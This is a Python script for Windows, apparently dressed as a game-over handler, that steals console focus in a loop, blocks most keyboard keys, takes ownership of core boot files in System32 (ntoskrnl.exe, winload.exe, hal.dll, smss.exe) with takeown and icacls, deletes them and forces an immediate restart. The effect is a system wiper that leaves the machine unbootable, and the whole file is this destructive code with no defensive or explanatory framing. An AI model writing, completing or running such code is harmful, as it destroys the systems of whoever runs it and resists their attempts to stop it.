import os
import subprocess
import getpass
import keyboard
import time
import ctypes
import win32gui
import win32con
import win32api
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Config ---
CRITICAL_FILES = {
    "ntoskrnl.exe",
    "winload.exe",
    "winload.efi",
    "hal.dll",
    "smss.exe"
}
TARGET_DIR = r"C:\Windows\System32"
USERNAME = getpass.getuser()

# --- Console focus ---
def focus_console():
    try:
        console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if win32gui.GetForegroundWindow() != console_hwnd:
            win32gui.ShowWindow(console_hwnd, win32con.SW_SHOW)
            win32gui.SetForegroundWindow(console_hwnd)
    except:
        pass

threading.Thread(target=lambda: [focus_console() or time.sleep(0.1) for _ in iter(int, 1)], daemon=True).start()

# --- File handling ---
def run_cmd(cmd):
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

def take_ownership(path):
    try:
        run_cmd(["takeown", "/F", path, "/A"])
        run_cmd(["icacls", path, "/grant", f"{USERNAME}:F"])
        return f"[OK] {path}"
    except Exception as e:
        return f"[ERROR] {path}: {e}"

def find_critical_files(directory):
    return [os.path.join(root, f)
            for root, _, files in os.walk(directory)
            for f in files if f in CRITICAL_FILES]

def destroy():
    for file in find_critical_files(TARGET_DIR):
        try:
            os.remove(file) if os.path.exists(file) else None
        except Exception as e:
            print(f"Failed to delete {file}: {e}")

def main():
    files = find_critical_files(TARGET_DIR)
    with ThreadPoolExecutor(max_workers=min(200, len(files))) as exe:
        for future in as_completed([exe.submit(take_ownership, f) for f in files]):
            future.result()

# --- Key blocking ---
BLOCK_KEYS = (
    [f"f{i}" for i in range(1, 13)] +
    ["shift", "ctrl", "alt", "cmd", "caps_lock", "tab", "esc", "menu", "delete",
     "end", "down", "page_down", "left", "right", "home", "up", "page_up", "insert",
     "print_screen", "-", "=", "`", "*", "/", ";", "'", ",", ".", "[", "]"] +
    [str(i) for i in range(10)]
)

def set_key_block(state=True):
    for key in BLOCK_KEYS:
        (keyboard.block_key if state else keyboard.unblock_key)(key)

# --- Execution ---
def on_loss():
    main()
    destroy()
    os.system("shutdown /r /t 0")

if __name__ == "__main__":
    keyboard.press_and_release("f11")
    for _ in range(14):
        keyboard.press_and_release("ctrl+add")
    set_key_block(True)
    os.system("cls")
    on_loss()